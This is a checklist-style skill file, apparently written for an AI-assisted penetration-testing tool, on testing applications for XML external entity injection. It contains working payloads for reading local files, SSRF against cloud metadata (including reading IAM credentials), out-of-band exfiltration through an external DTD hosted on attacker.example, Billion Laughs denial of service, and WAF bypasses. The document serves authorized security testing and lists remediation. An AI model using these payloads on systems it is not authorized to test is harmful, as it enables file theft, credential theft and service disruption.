---
name: xxe-testing
description: XML external entity injection for file read, SSRF, and DoS
origin: AI Threat Hunting
---

# XXE Testing (XML External Entity Injection)

## When to Activate

- Application accepts XML input (SOAP, REST with XML, file upload)
- Content-Type `application/xml` or `text/xml` accepted
- File formats that use XML internally (DOCX, XLSX, SVG, XHTML)

## Tools

- `aith assess kali exec -- curl ...` (send crafted XML — all target-facing curl must go through the kali exec wrapper; use `--technique XXE --probe-kind payload --phase consume-test --timeout 30` for XXE attempts)
- Burp Suite Repeater (craft XML payloads — then replay via kali exec for audit pipeline coverage)
- XXEinjector (run via `aith assess kali exec --technique XXE --probe-kind payload --phase consume-test --timeout 300 -- ...`)
- OOB callbacks: verify readiness with `aith oob status --json`; start a named client with `aith oob client start <name> --engagement <key> --agent <agent>`; get the unique callback URL and check correlated hits with `aith oob client logs <name> --lines 80`; fall back to time-based detection when OOB is unavailable

## Methodology

### 1. Identify XML Input Points

- [ ] API endpoints accepting XML body
- [ ] SOAP services
- [ ] File upload: SVG, DOCX, XLSX, XML config
- [ ] Change `Content-Type: application/json` to `application/xml` — test if accepted
- [ ] RSS/Atom feed import, SAML assertions

### 2. Classic XXE — File Read

- [ ] Basic entity:
      ```xml
      <?xml version="1.0"?>
      <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
      ]>
      <root>&xxe;</root>
      ```
- [ ] Windows: `file:///C:/windows/win.ini`
- [ ] PHP wrapper: `php://filter/convert.base64-encode/resource=/etc/passwd`
- [ ] Directory listing (Java): `file:///etc/` (may work on some parsers)

### 3. SSRF via XXE

- [ ] `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`
- [ ] Internal service probe: `http://localhost:8080/`, `http://internal-host/`
- [ ] Cloud metadata: AWS, GCP, Azure endpoints
- [ ] Port scan: observe error differences per port

### 4. Blind XXE — Out-of-Band

- [ ] Parameter entity + external DTD:
      ```xml
      <!DOCTYPE foo [
        <!ENTITY % xxe SYSTEM "http://attacker.example/evil.dtd">
        %xxe;
      ]>
      ```
- [ ] External DTD (`evil.dtd`):
      ```xml
      <!ENTITY % file SYSTEM "file:///etc/passwd">
      <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/?d=%file;'>">
      %eval;
      %exfil;
      ```
- [ ] Error-based exfiltration: force parse error containing file data
- [ ] FTP-based exfiltration for multi-line files

### 5. Denial of Service

- [ ] Billion Laughs:
      ```xml
      <!ENTITY lol "lol">
      <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
      <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
      ```
- [ ] Recursive entity expansion
- [ ] External entity pointing to `/dev/random` or large file

### 6. Bypass Techniques

- [ ] UTF-16 encoding: `<?xml version="1.0" encoding="UTF-16"?>`
- [ ] CDATA wrapping to exfiltrate XML-breaking characters
- [ ] XInclude: `<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>`
- [ ] HTML entities instead of XML entities
- [ ] Content-Type switch: JSON → XML if parser auto-detects
- [ ] Nested ENTITY definitions to evade WAF patterns

### 7. SVG / Office File XXE

- [ ] Embed XXE in SVG uploaded as image
- [ ] Embed XXE in DOCX: modify `[Content_Types].xml` or embedded XML parts
- [ ] XLSX: inject in `xl/sharedStrings.xml`

## What to Record

- Endpoint and input vector (body, file upload, header)
- Payload used and data exfiltrated
- Blind vs reflected
- Out-of-band callback evidence from `aith oob client logs <name>`
- Internal resources accessed (files, metadata, services) — confirming the OOB callback fires is not enough; you must show the **attacker outcome** (e.g., `/etc/passwd` contents were returned in the response or exfiltrated via OOB DTD chain, AWS IAM credentials were read from the metadata endpoint via SSRF-XXE chain, file read primitive was demonstrated on a meaningful secret file)
- Severity: Critical (file read/SSRF) or High (blind confirmed)
- Remediation: disable DTD processing, disable external entities, use JSON

## Extended Resources

- `agent/references/payloads/xxe-payloads.md` — file read, OOB/blind XXE, DoS, context-specific (SOAP, SVG, DOCX)
